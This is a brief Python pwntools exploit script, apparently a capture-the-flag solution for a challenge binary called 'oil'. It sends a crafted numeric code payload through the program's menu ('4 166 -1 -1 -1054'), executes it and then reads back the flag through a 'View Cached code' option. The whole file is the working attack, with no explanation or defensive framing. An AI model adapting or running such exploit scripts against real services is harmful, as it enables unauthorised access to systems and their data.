from pwn import*
context.log_level = 'debug'

p = process("./oil")
# p = remote('localhost', 1234)

# Write Code
p.sendlineafter('> ', '2')
p.sendafter('Enter your Program\'s Name : ', 'flag')
p.sendlineafter('Enter Code : ','4 166 -1 -1 -1054')

# Run Code
p.sendlineafter('> ', '3')

# Get flag with View Cached code
p.sendlineafter('> ', '4')

p.interactive()